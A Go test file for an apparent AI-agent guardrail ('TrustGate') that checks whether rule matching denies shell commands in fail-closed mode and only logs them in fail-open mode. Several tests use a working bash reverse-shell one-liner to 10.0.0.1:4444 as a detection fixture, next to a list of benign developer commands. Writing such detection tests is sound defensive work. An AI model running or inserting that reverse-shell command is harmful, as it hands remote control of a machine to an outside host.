package hookrunner

import (
	"testing"

	"github.com/malanta-ai/Malanta-TrustGate/internal/atr"
	"github.com/malanta-ai/Malanta-TrustGate/internal/config"
	"github.com/malanta-ai/Malanta-TrustGate/internal/verdict"
)

// TestApplyATR_NoContentIsNoOp asserts that hooks which opt out of
// ATR (by leaving Result.ATRContent or Result.ATRTargets empty) get
// the original Decision back untouched. This is the contract the
// before-prompt + before-tool-use hooks rely on — they have no
// content surface for ATR yet and must remain identical to the
// pre-ATR build.
func TestApplyATR_NoContentIsNoOp(t *testing.T) {
	d := verdict.Decision{Allow: true}
	applyATR(&d, Result{
		ATRContent: "",
		ATRTargets: []atr.Target{atr.TargetReadFile},
	}, config.Config{FailClosed: true})
	if !d.Allow {
		t.Error("applyATR with empty ATRContent must not change Allow")
	}
	if d.ATRMatches != nil {
		t.Error("applyATR with empty ATRContent must not record ATRMatches")
	}
}

func TestApplyATR_NoTargetsIsNoOp(t *testing.T) {
	d := verdict.Decision{Allow: true}
	applyATR(&d, Result{
		ATRContent: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
		ATRTargets: nil,
	}, config.Config{FailClosed: true})
	if !d.Allow {
		t.Error("applyATR with empty ATRTargets must not change Allow")
	}
	if d.ATRMatches != nil {
		t.Error("applyATR with empty ATRTargets must not record ATRMatches")
	}
}

// TestApplyATR_ShellReverseShellTriggers asserts that a reverse-shell
// payload fed to the shell target produces a critical match and the
// decision flips to deny in failClosed mode.
func TestApplyATR_ShellReverseShellTriggers(t *testing.T) {
	d := verdict.Decision{Allow: true}
	applyATR(&d, Result{
		ATRContent: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
		ATRTargets: []atr.Target{atr.TargetShell},
	}, config.Config{FailClosed: true})
	if d.Allow {
		t.Error("Critical reverse-shell match must flip Allow to deny in failClosed mode")
	}
	if len(d.ATRMatches) == 0 {
		t.Error("ATRMatches must be populated when a rule fires")
	}
	if d.Reason == "" {
		t.Error("Reason must be set when ATR triggers a deny")
	}
}

// TestApplyATR_BenignShellAllowed asserts negative coverage: ordinary
// developer shell commands must not produce ATR matches.
func TestApplyATR_BenignShellAllowed(t *testing.T) {
	benignCommands := []string{
		"git status",
		"npm install",
		"go test ./...",
		"ls -la",
		"cat README.md",
		"docker compose up -d",
		"kubectl get pods",
		"make build",
	}
	for _, cmd := range benignCommands {
		d := verdict.Decision{Allow: true}
		applyATR(&d, Result{
			ATRContent: cmd,
			ATRTargets: []atr.Target{atr.TargetShell},
		}, config.Config{FailClosed: true})
		if !d.Allow {
			t.Errorf("Benign command %q triggered ATR deny: %s", cmd, d.Reason)
		}
		if len(d.ATRMatches) > 0 {
			t.Errorf("Benign command %q produced ATR matches: %+v", cmd, d.ATRMatches)
		}
	}
}

// TestApplyATR_FailOpenObservesButDoesNotDeny asserts that fail-OPEN
// deployments record ATR matches in the decision but never use them
// to block. This protects the customer-facing contract: enabling ATR
// in observability mode (cfg.FailClosed=false) must be a strict
// superset of the pre-ATR behavior.
func TestApplyATR_FailOpenObservesButDoesNotDeny(t *testing.T) {
	d := verdict.Decision{Allow: true}
	applyATR(&d, Result{
		ATRContent: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
		ATRTargets: []atr.Target{atr.TargetShell},
	}, config.Config{FailClosed: false})
	if !d.Allow {
		t.Error("FailOpen must not flip Allow regardless of ATR severity")
	}
	if len(d.ATRMatches) == 0 {
		t.Error("FailOpen must still record matches for audit trail")
	}
}
